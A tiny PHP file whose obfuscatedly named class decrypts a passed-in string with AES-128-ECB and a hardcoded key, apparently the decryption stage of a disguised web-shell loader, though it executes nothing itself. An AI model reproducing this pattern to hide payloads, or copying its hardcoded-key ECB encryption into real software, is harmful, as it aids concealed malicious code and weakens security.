<?php
	class Sulot
	{
		public function Rose($own)
		{
			$Balds = 'd87qrjio8!5';
			return(openssl_decrypt($own,"AES-128-ECB",$Balds));

		}
		public function _XYZ($code)
		{
			$eXec = new Sulot();
			return $eXec->Rose($code);
		}
	}
?>

